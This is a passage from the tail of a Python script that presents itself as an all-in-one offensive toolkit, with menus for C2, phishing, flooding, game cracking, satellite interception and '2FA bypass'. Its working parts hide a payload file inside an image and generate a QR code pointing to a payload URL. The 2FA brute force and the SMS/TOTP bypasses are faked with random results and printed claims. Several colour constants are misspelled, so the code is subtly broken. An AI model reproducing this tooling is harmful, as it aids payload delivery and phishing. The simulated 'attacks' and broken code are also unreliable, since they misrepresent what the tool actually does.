            'payload': base64.b64encode(os.urandom(32)).decode()
        }
        print(f"{Fore.YELLOW}[!] Intercepted: {data}")
        
    def menu(self):
        while True:
            print(f"\n{Fore.CYAN}{'='*50}")
            print(f"{Fore.RED}🛰️ SATELLITE INTERCEPT")
            print(f"{Fore.CYAN}{'='*50}")
            print(f"[1] Track Satellites")
            print(f"[2] Intercept Data Packets")
            print(f"[3] Decrypt Satellite Feed")
            print(f"[4] Back to Main Menu")
            
            choice = input(f"\n{Fore.YELLOW}[?] Select: {Fore.WHITE}")
            
            if choice == '1':
                self.track_satellite()
            elif choice == '2':
                self.intercept_data()
            elif choice == '4':
                break
                
            input(f"{Fore.CYAN}[*] Press Enter to continue...")

# ============================================================
# STEGANOGRAPHY MODULE
# ============================================================
class Steganography:
    def __init__(self):
        pass
        
    def hide_data_in_image(self):
        """Hide malicious payload in image"""
        print(f"{Fore.CYAN}[*] Hiding payload in image...")
        
        image_path = input(f"{Fore.YELLOW}[?] Image path: {Fore.WHITE}")
        payload_path = input(f"{Fore.YELLOW}[?] Payload file path: {Fore.WHITE}")
        
        output_path = f"{Config.OUTPUT_DIR}/stego_image.png"
        
        try:
            from PIL import Image
            import stepic
            
            img = Image.open(image_path)
            with open(payload_path, 'rb') as f:
                payload = f.read()
                
            encoded = stepic.encode(img, payload)
            encoded.save(output_path)
            print(f"{Fore.GREEN}[+] Hidden payload in {output_path}")
        except:
            print(f"{Fore.RED}[-] Steganography failed (install stepic)")
            
    def extract_data_from_image(self):
        """Extract hidden data from image"""
        print(f"{Fore.CYAN}[*] Extracting hidden data...")
        image_path = input(f"{Fore.YELLOW}[?] Image path: {Fore.WHITE}")
        
        try:
            from PIL import Image
            import stepic
            
            img = Image.open(image_path)
            data = stepic.decode(img)
            print(f"{Fore.GREEN}[+] Extracted: {data[:100]}...")
        except:
            print(f"{Fore.RED}[-] Extraction failed")
            
    def generate_malicious_qr(self):
        """Generate QR code with malicious link"""
        print(f"{Fore.CYAN}[*] Generating malicious QR code...")
        
        payload_url = input(f"{Fore.YELLOW}[?] Payload URL: {Fore.WHITE}")
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(payload_url)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        output_path = f"{Config.OUTPUT_DIR}/malicious_qr.png"
        img.save(output_path)
        print(f"{Fore.GREEN}[+] QR saved: {output_path}")
        
    def menu(self):
        while True:
            print(f"\n{Fore.Cyan}{'='*50}")
            print(f"{Fore.RED}🎭 STEGANOGRAPHY LAB")
            print(f"{Fore.Cyan}{'='*50}")
            print(f"[1] Hide Payload in Image")
            print(f"[2] Extract Payload from Image")
            print(f"[3] Generate Malicious QR Code")
            print(f"[4] Generate Audio Steganography")
            print(f"[5] Back to Main Menu")
            
            choice = input(f"\n{Fore.YELLOW}[?] Select: {Fore.WHITE}")
            
            if choice == '1':
                self.hide_data_in_image()
            elif choice == '2':
                self.extract_data_from_image()
            elif choice == '3':
                self.generate_malicious_qr()
            elif choice == '5':
                break
                
            input(f"{Fore.Cyan}[*] Press Enter to continue...")

# ============================================================
# 2FA BYPASS MODULE
# ============================================================
class TwoFABypass:
    def __init__(self):
        self.proxies = []
        
    def brute_force_2fa(self):
        print(f"{Fore.Cyan}[*] Brute forcing 2FA codes...")
        target = input(f"{Fore.YELLOW}[?] Target URL: {Fore.WHITE}")
        length = input(f"{Fore.YELLOW}[?] Code length (4/6/8): {Fore.WHITE}")
        
        print(f"{Fore.Green}[+] Starting multi-threaded attack...")
        
        def try_code(code):
            # Simulate API call
            time.sleep(0.001)
            if random.random() < 0.0001:  # 0.01% chance
                print(f"{Fore.RED}[!] Code found: {code}")
                return True
            return False
            
        # Multi-threaded attack
        threads = []
        for i in range(1000):
            t = threading.Thread(target=try_code, args=(str(i).zfill(int(length)),))
            threads.append(t)
            t.start()
            
        for t in threads:
            t.join()
            
    def bypass_sms_2fa(self):
        print(f"{Fore.Cyan}[*] Bypassing SMS-based 2FA...")
        print(f"{Fore.Green}[+] SIM swapping simulation")
        print(f"{Fore.Green}[+] Intercepting SMS...")
        
    def bypass_totp(self):
        print(f"{Fore.Cyan}[*] Bypassing TOTP...")
        print(f"{Fore.Green}[+] Time-based exploit active")
        
    def menu(self):
        while True:
            print(f"\n{Fore.Cyan}{'='*50}")
            print(f"{Fore.RED}🔓 2FA BYPASS SUITE")
            print(f"{Fore.Cyan}{'='*50}")
            print(f"[1] Brute Force 2FA Codes")
            print(f"[2] SMS 2FA Bypass")
            print(f"[3] TOTP Bypass")
            print(f"[4] Backup Code Generator")
            print(f"[5] Back to Main Menu")
            
            choice = input(f"\n{Fore.YELLOW}[?] Select: {Fore.WHITE}")
            
            if choice == '1':
                self.brute_force_2fa()
            elif choice == '2':
                self.bypass_sms_2fa()
            elif choice == '3':
                self.bypass_totp()
            elif choice == '5':
                break
                
            input(f"{Fore.Cyan}[*] Press Enter to continue...")

# ============================================================
# MAIN APPLICATION
# ============================================================
class StealthUtility:
    def __init__(self):
        self.modules = {
            '1': ('War Room (C2)', WarRoom()),
            '2': ('Social Engineering 2.0', SocialEngineering()),
            '3': ('Deep-Web OSINT', DeepWebOSINT()),
            '4': ('Network Silence', NetworkSilence()),
            '5': ('Game Cracking (100+)', GameCracking()),
            '6': ('Ghost Communications', GhostComms()),
            '7': ('Satellite Intercept', SatelliteIntercept()),
            '8': ('Steganography Lab', Steganography()),
            '9': ('2FA Bypass Suite', TwoFABypass())
        }
        
    def clear_screen(self):
        os.system('clear')
        
    def print_menu(self):
        Banner.print_full_banner()
        
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.RED}  ⚡ MAIN BATTLE MENU ⚡")
        print(f"{Fore.CYAN}{'='*80}")
        
        menu_items = [
            ("1", "🏢 War Room (C2)", "Command & Control Center"),
            ("2", "🎭 Social Engineering 2.0", "100+ Phishing Templates"),
            ("3", "🌐 Deep-Web OSINT", "Dark Web & Breach Search"),
            ("4", "🔒 Network Silence", "VPN/Tor/Proxy Tools"),
            ("5", "🎮 Game Cracking", "100+ Game Hacks"),
            ("6", "👻 Ghost Communications", "Spoof/Bomb/Flood"),
            ("7", "🛰️ Satellite Intercept", "Real-time Tracking"),
            ("8", "🎨 Steganography Lab", "Malicious Image Hiding"),
            ("9", "🔓 2FA Bypass Suite", "Brute Force & Bypass"),
            ("0", "❌ Exit", "Terminate Session")
        ]
        
        for num, name, desc in menu_items:
            print(f"{Fore.GREEN}[{num}] {Fore.YELLOW}{name:<25} {Fore.CYAN}- {desc}")
            
        print(f"{Fore.CYAN}{'='*80}")
        
    def run(self):
        while True:
            self.clear_screen()
            self.print_menu()
            
            choice = input(f"\n{Fore.RED}[{Fore.WHITE}VORTEX{Fore.RED}]{Fore.WHITE} $> {Fore.YELLOW}")
            
            if choice == '0':
                print(f"{Fore.RED}[!] Shutting down...")
                sys.exit(0)
            elif choice in self.modules:
                name, module = self.modules[choice]
                module.menu()
            else:
                print(f"{Fore.RED}[!] Invalid choice")
                time.sleep(1)

# ============================================================
# ENTRY POINT
# ============================================================
if __name__ == "__main__":
    # Check for root
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] This tool requires root privileges!")
        print(f"{Fore.YELLOW}[*] Restarting with sudo...")
        os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
        
    # Handle Ctrl+C
    signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))
    
    # Run application
    app = StealthUtility()
    app.run()